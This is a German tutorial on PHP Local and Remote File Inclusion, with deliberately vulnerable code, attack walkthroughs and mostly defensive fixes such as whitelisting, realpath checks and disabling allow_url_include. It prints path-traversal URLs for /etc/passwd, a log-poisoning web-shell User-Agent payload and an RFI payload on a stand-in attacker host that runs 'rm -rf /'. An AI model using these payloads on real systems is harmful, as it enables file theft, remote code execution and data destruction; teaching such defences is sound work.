<div align="center"> 
<h1>Inhaltsverzeichnis</h1>
</div>


- [**Was ist File Inclusion und warum ist es so gefährlich?**](#was-ist-file-inclusion-und-warum-ist-es-so-gefährlich)
- [**Die zweite Geschite der File Inclusion: LFI und RFI**](#die-zweite-geschite-der-file-inclusion-lfi-und-rfi)
  - [**Lokale Dateibindung (Local File Inclusion, LFI)**](#lokale-dateibindung-local-file-inclusion-lfi)
    - [**Wie eine LFI-Schwachstelle aussehen könnte (PHP-Beispiel)**](#wie-eine-lfi-schwachstelle-aussehen-könnte-php-beispiel)
  - [**So nutzt ein Angreifer LFI aus:**](#so-nutzt-ein-angreifer-lfi-aus)
    - [**Beispiel 1: Auslesen von Systemdatein (z.B. Linux Passwortdatein)**](#beispiel-1-auslesen-von-systemdatein-zb-linux-passwortdatein)
    - [**Beispiel 2: Ausführen von Logdatein (Log Poisoning für RCE)**](#beispiel-2-ausführen-von-logdatein-log-poisoning-für-rce)
- [**Externe Dateieinbung (Remote File Inclusion, RFI)**](#externe-dateieinbung-remote-file-inclusion-rfi)
  - [**Wie eine RFI-Schwachstelle aussehen könnte (PHP-Beispiel)**](#wie-eine-rfi-schwachstelle-aussehen-könnte-php-beispiel)
  - [**So nutzt ein Angreifer RFI aus:**](#so-nutzt-ein-angreifer-rfi-aus)
- [**Wie kann man File Inclusion-Schwachstellen beheben?**](#wie-kann-man-file-inclusion-schwachstellen-beheben)
    - [**1. Eingabe Immer validieren und filtern (Der absolute Grundstein!)**](#1-eingabe-immer-validieren-und-filtern-der-absolute-grundstein)
    - [**2. Servereinstellungen richtig konfigurieren (Besonders wichtig für RFI)**](#2-servereinstellungen-richtig-konfigurieren-besonders-wichtig-für-rfi)
    - [**3. Prinzip der geringsten Rechte (Least Privilege)**](#3-prinzip-der-geringsten-rechte-least-privilege)
    - [**4. Regelmäßige Sicherheits-Updates**](#4-regelmäßige-sicherheits-updates)
    - [**5. Web Application Firewall (WAF)**](#5-web-application-firewall-waf)

---


## **Was ist File Inclusion und warum ist es so gefährlich?**

Stellen Sie sich vor, Ihre Website ist wie ein Restaurant. Sie haben eine Speisekarte (Ihre Webseite), und wenn ein Gast etwas bestellt (eine URL aufruft), liefert die Küche (der Webserver) das passende Gericht (die angeforderte Datei).

Bei einer **File Inclusion-Schwachstelle** gibt es einen Fehler in der Küche: Der Koch (Ihr Webserver-Skript) vertraut blind auf die Bestellung des Gastest und bereitet nicht nur Gerichte von der Speisekarte zu, sondern könnte auf Anweisung des Gastes auch Zutaten aus dem Lager holen, die gar nicht für die Speisekarte gedacht sind - oder noch schlimmer: Er könnte Versuchen, Zutaten von einem Lieferant zu beziehen, der für das Restaurant gar nicht zugelassen ist!

Genau das passiert bei File Inclusion: Eine Webanwendung bindet Dateien in ihr Skript ein, deren Pfade oder Namen sie direkt von einer **Benutzereingabe** (z.B. einem Teil der URL) erhält, ohne diese Eingabe ausreichend zu prüfen.

**Warum ist das gefährlich?** Weil ein Angreifer diese fehlende Prüfung ausnutzen kann:

- **Datendiebstall:** Der Angreifer kann sensible Daten auf Ihrem Server auslesen (z.B. Benutzername, Passwörter, Konfigurationsdaten).
- **Website-Manipulation:** Er kann Inhalt Ihrer Website ändern oder unschöne Nachrichten einblenden.
- **Schadcode-Ausführung (Remote Code Execution, RCE):** Das ist das schlimmste Szenario. Der Angreifer kann **beliebigen Code auf Ihrem Server ausführen**. Das gibt ihm die volle Kontrolle über Ihre Website und potenziell über den gesamten Server. Er könnte Schadsoftware installieren, Ihre Datenbank löschen oder Ihre Server für weitere Angriffe nutzen.

---


## **Die zweite Geschite der File Inclusion: LFI und RFI**

Es gibt zwei Haupttypen dieser Sicherheitslücke, die sich darin unterscheiden, woher die eingebundenen Daten stammen:

### **Lokale Dateibindung (Local File Inclusion, LFI)**

Bei **LFI** zwingt der Angreifer Ihre Webanwendung, **eine Datei zu laden und auszuführen, die sich bereits auf Ihrem eigenen Webserver befindet**. Der Angreifer nutzt dabei Navigationsbefehle, um aus dem Webverzeichnis auszubrechen und auf andere Bereiche des Dateisystems Ihres Servers zuzugreifen.


#### **Wie eine LFI-Schwachstelle aussehen könnte (PHP-Beispiel)**

> **Sprache:** PHP

```php
<?php
// seite.php - ANFÄLLIGER CODE FÜR LFI
$abschnitt = $_GET['teil']; // Nimmt den Wer des 'teil'-Paramets aus der URL
include($abschnitt . '.html'); // Bindet die Datei ein z.B. 'ueber_uns.html' 
?>
```

Ein normaler Aufruf wäre `https://ihre-webiste-de/seite.php?teil=kontakt` (würde `kontakt.html` laden).

---

### **So nutzt ein Angreifer LFI aus:**

Der Angreifer weiß, dass `$_GET['teil']` direkt in den `include()`-Befehl fließt. Er könnte nun versuchen, Pfadmanipulationen durchzuführen:

#### **Beispiel 1: Auslesen von Systemdatein (z.B. Linux Passwortdatein)**

- **Angreifer-URL:** `https://ihre-website.de/seite1.php?teil=../../../../etc/passwd`
- **Was passiert intern:** Ihr Webserver versucht die Datei `../../../../etc/passwd.html` zu laden.
  - Die Zeichenfolge `../` bedeutet "gehe ein Verzeichnis nach oben".
  - Durch mehrfaches Wiederholen (`../../../..`) navigiert der Angreifer aus dem aktuellen Verzeichnis heraus und bewegt sich im Dateisystem Ihres Server nach oben, bis er das Wurzelverzeichnis erreicht hat.
  - Von dort aus versucht er, auf die Datei `/etc/passwd`  zuzugreifen.
- **Ergebnis:** Wenn der Server nicht korrekt konfiguriert ist und diese Datei lesbar ist, wird ihr Inhalt (der Benutzername und andere Systeminformatione erhält) direkt im Browser des Angreifers angezeigt. Auch wenn die `.html`-Endung angeghängt wird, kann der Inhalt der Textdatei oft trotzdem angezeigt werden.

#### **Beispiel 2: Ausführen von Logdatein (Log Poisoning für RCE)**

Das ist eine fortschrittliche LFI-Technik, die zu **Remote Code Execution (RCE)** führen kann.

1. **Schritte des Angreifers: Code in Logdatei einschleusen**
   1. Viele Webserver protokollieren Zugriffe in Dateien (z.B. `/var/log/apache2/acces.log`).
   2. Der Angreifer sendet eine spezielle HTTP-Anfrage an Ihre Website, die **PHP-Code in einem normalerweise unkritischen Feld** (z.B. im **User-Agent**-Header) enthält:  

        ```
        GET / HTTP/1.1
        User-Agent: <?php system($_GET['cmd']); ?> *(nicht ausführen - nur Erklärung)*
        Host: ihre-website.de
        ```

        Oder:

        ```
        GET / HTTP/1.1
        User-Agent: PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7 ?> *(nicht ausführen - nur Erklärung)*
        Host: ihre-website.de
        ```

   3. Ihre Webserver schreibt diesen User-Agent-String unverändert in seine `acces.log`-Datei.  

<br>

2. **Schritt des Angreifers: Logdatei über LFI einbinden**
   1. **Angreifer-URL:** `https://ihre-website.de/seite.php?teil=../../../../var/log/apache2/access.log`
   2. **Was passiert intern:** Ihr Webserver versucht, die Logdatei einzubinden. Da die Logdatei nun den vom Angreifer eingeschleusten PHP-Code enthält und von Ihrer Anwendung als PHP interpretiert wird, wird dieser Code ausgeführt.
   3. **Ergebnis:** Der Angreifer hat jetzt die Möglichkeit, beliebige Befehle auf ihren Server auszuführen, indem er einen weiteren Parameter (`cmd`) an die URL hängt, z.B.: `http://ihre-website.de/seite.php?teil=../../../../var/log/apache2/access.log&cmd=ls%20-la` (zeigt eine Liste der Dateien im aktuellen Verzeichnis an).

---

## **Externe Dateieinbung (Remote File Inclusion, RFI)**

Bei **RFI** zwingt der Angreifer Ihre Webanwendung, **eine Datei von einem externen Server zu laden und auszuführen, den der Angreifer selbst kontrolliert.** Dies ist in der Regel gefährlicher als LFI, da der Angreifer den Inhalt der Datei vollständig bestimmen kann.

**Voraussetzung für RFI:** Die PHP-Konfiguration auf Ihrem Server muss `allow_uri_include = On` gesetzt haben. Glücklicherweise ist dies in modernen PHP-Versionen standardmäßig auf `Off` (deaktiviert), aber ältere oder falsch konfigurierte Systeme können anfällig sein.

### **Wie eine RFI-Schwachstelle aussehen könnte (PHP-Beispiel)**

Nehmen wir ein ähnliches, aber noch anfälligeres Skript:

> **PHP**

```php
<?php
// laden.php = ANFÄLLIGER CODE FÜR RFI
$ressource = $_GET['quelle']; //Nimmt den Wert des 'quelle' - Parameters
include($ressource); //Bindet die angegebene Ressource ein
?>
```
Ein normaler Aufruf wäre: `https://ihre-website.de/laden.php?quelle=lokale_datei.php`

---

### **So nutzt ein Angreifer RFI aus:**

1. **Vorbereitung durch den Angreifer:** Der Angreifer erstellt eine kleine Datei mit bösartigen PHP-Code und legt sie auf seinem eigenen Webserver ab, z.B. unter `https://angreifer.com/meine_schadsoftware.txt`: 

    >**PHP**

    ```php
    <?php
    echo "<h1>Ihre Website wurde gehackt!</h1>";
    system("rm -rf /"); // Extrem gefährlicher Befehl: Löscht das gesamte Dateisystem!
    ?>
    ```

(Wichtig: Die Dateiendung ist hier irrelevant, da der Inhalt vom angreifenden Server kommt und die Opferanwendung ihn als PHP-Code interpretiert.)

2. **Angriff auf Ihre Website:** Der Angreifer ruft Ihre Website mit diesen URL auf:  <br> `https://ihre-website.de/laden.php?quelle=https://angreifer.com/meine_schadsoftware.txt` 

- **Was passier intern:**
  - Die Variable `$ressource` erhält den Wert  <br> `https://angreifer.com/meine_schadsoftware.txt`
  - Der `include()`-Befehl auf Ihrem Server lädt den Inhalt dieser externen URL.
  - Da `allow_url_include` auf `On` steht, interpretiert Ihr Server den heruntergeladenen Inhalt als PHP-Code und **führt ihn aus**.
- **Ergebnis:** Die Nachricht *Ihre Website wurde gehackt!* erscheint, und (im schlimmsten Fall) wird der gefährliche Befehl `system("rm -fr /");` ausgeführt, was zur **vollständigen Löschung der Serverdaten** führen könnte. **Dies ist die direkte Remote Code Execution.**

---

## **Wie kann man File Inclusion-Schwachstellen beheben?**

Die gute Nachricht ist, dass diese Schwachstelle **vermeidbar** sind! Der goldene Grundsatz der IT-Sicherheit lautet: **Vertraue niemals Benutzereingaben!** Wenden Sie diese Prinzipien konsequent an:

#### **1. Eingabe Immer validieren und filtern (Der absolute Grundstein!)**

Dies ist die wichtigiste Maßnahme. Sie müssen sicherstellen, dass jede Eingabe, die Sie von einem Benutzer erhalten (sei es über URLs, Formulare oder andere Quellen), genau das ist, was Sie erwarten, und nichts Böses enthält.

- **A) Whitelisting (Die sicherste Methode):**
  - Erlauben Sie nur eine **explizit definierte Liste** von Werten. Alles andere wird abgelehnt.
  - **Beispiel für LFI-Schutz:**

    > **PHP**

    ```php
    <?php
    // seite.php - SICHERER CODE DURCH WHITELISTING
    $erlaubte_seiten = ['home', 'kontakt', 'ueber_uns', 'impressum'];
    $abschnitt = $_GET['teil'];

    if (in_array($abschnitt, $erlaubte_seiten)) {
    // Nur wenn der Wert in der erlaubten Liste ist, wird die Datei eingebunden
    include($abschnitt . '.html');
    }   else {
    // Andernfalls wird ein Fehler ausgegeben oder auf eine Standardseite umgeleitet
    echo "Fehler: Die angeforderte Seite ist nicht verfügbar.";
    // Oder header("Location: /404.html");
    }
    ?>
    ```

    Hiermit kann der Angreifer niemals `../../../../etc/passwd` einfügen, da diese Zeichenfolge nicht in der `erlaubte_seiten`-Liste steht.

    <br>

  - **B) Pfadnormalisierung und Überprüfung (für komplexere Fälle):**  
    - Wenn Sie keine feste Whitlist verwenden können (z.B. weil es zu viele Daten gibt), müssen Sie sicherstellen, dass Benutzerangaben keine Pfad-Traversal-Sequenzen (`../` oder `..\`) enthalten.
    - Verwenden Sie Funktionen wie `basename()` (entfernt Pfadinformationen, lässt nur Dateiname übrig) oder `realpath()` (löst einen Pfad zu seinem absoluten, sicheren Pfad auf).
    - **Beispiel für LFI Schutz mit `basename()`:**
    
        > **PHP**

        ```php
        <?php
        // datei_laden.php - SICHERER CODE MIT BASENAME() UND EXPLIZITEM PFAD
        $angeforderter_name = $_GET['datei'];

        // 1. Nur den Dateinamen extrahieren, alle Pfadinformationen entfernen
        $sicherer_dateiname = basename($angeforderter_name);

        // 2. Den sicheren Dateinamen mit einem festen, bekannten Verzeichnis kombinieren
        $vollstaendiger_pfad = '/var/www/html/inhalte/' . $sicherer_dateiname . '.txt';

        // 3. Überprüfen, ob die Datei tatsächlich existiert und innerhalb des gewünschten Verzeichnisses liegt
        //    realpath() ist hier sehr nützlich, um zu prüfen, ob der Pfad nicht zu einem anderen Ort führt
        if (file_exists($vollstaendiger_pfad) && strpos(realpath($vollstaendiger_pfad), '/var/www/html/inhalte/') === 0) {
        include($vollstaendiger_pfad);
        }   else {
        echo "Fehler: Ungültige Datei oder Zugriff verweigert.";
        }
        ?>
        ```

        `strpos(realpath(...), ...)` stellt hier sicher, dass der aufgelöste Pfad auch wirklich mit Ihrem gewünschten Basisverzeichnis beginnt und nicht "ausbricht".

#### **2. Servereinstellungen richtig konfigurieren (Besonders wichtig für RFI)**

Ihre PHP-Konfiguration ist ein Bollwerk gegen RFI.

- `allow_url_include = Off` **(PHP-Einstellung):**
  - **Dies ist der wichtigste Schutz gegen RFI.** Stellen sie sicher, dass in Ihre `php.ini`-Datei (der Konfigurationsdazei für PHP) dieser Wert auf `Off` gesetzt ist. <br><br>
  
    ```ini
    ; In Ihre php.ini
    allow_url_include = Off
    ```

  - Diese Einstellung verbietet PHP, Dateien von externen URLs über `include()` oder `require()` zu laden.
  - **Überprüfen Sie dies sofort!** Wenn es auf `On` steht, sind Sie potenziell extrem anfällig. Nach einer Änderung der `php.ini` müssen Sie Ihrem Webserver (Apache, Ngnix) neu starten, damit die Änderungen wirksam werden.
  - `allow_url_fopen = OFF` **(Optional, aber empfehlenswert):**
    - Diese Einstellung kontrolliert, ob PHP Dateien über URL-Protokolle (`http://`, `ftp://`) öffnen kann (nicht unbedingt includen, aber lesen).
    - Wenn Ihre Anwendung keine Notwendigkeit hat, entferne Dateien über URLs zu öffnen, können Sie auch diese Einstellung auf `Off` setzen, um eine weitere Angriffsfläche zu schließen.


#### **3. Prinzip der geringsten Rechte (Least Privilege)**

- Stellen Sie sicher, dass der Benutzer, unter dem Ihe Webserver-Prozesse laufen (oft `www-data` oder `apache`), nur die minimal notwendigen Berechtigung hat.
- Er sollte **keinen Lesezugriff** auf sensible Systemdateien wie `/etc/passwd`, `etc/shadow` oder Datenbank-Konfigurationsdateien haben, die nicht direkt zum Betrieb der Website gehören.
- Schreibrechte sollten auf das absolut notwendige Minimum beschränkt sein (z.B. Upload-Ordner, aber nicht das gesammte Webroot-Verzeichnis).


#### **4. Regelmäßige Sicherheits-Updates**
- Halten Sie ihr **Betriebssystem**, Ihren **Webserver** (Apache, Nginx, IIS) und Ihre **Skriptprache** (PHP, Python, Node.js) immer auf dem neusten Stand. Software-Updates enthalten oft wichtige Sicherheitspatches für bekannte Schwachstellen.


#### **5. Web Application Firewall (WAF)**

- Eine WAF ist ein Schutzschild von Ihre Webanwendung, das bösswillige Anfragen erkennen und blockieren kann, bevor sie Ihre Anwendung überhaupt erreicht. Viele WAFs haben Regeln, die typische File Inclusion-Angriffe (z.B. mit `../` oder `http://`) erkennen.


---

![img](https://storage.googleapis.com/github-storage-daonware/Cybersecurity/statistic-exploit.png)

Indem Sie diese Maßnahmen sorgfältig umsetzen, können Sie die Sicherheit Ihre Website erheblich verbessern und sich vor potenziell verheerenden Folgen von File Inclusion-Angriffen schützen. Es geht darum, misstrauisch gegenüber allem zu sein, was von außen kommt, und nur das zuzulassen, was Sie expliziet erwarten.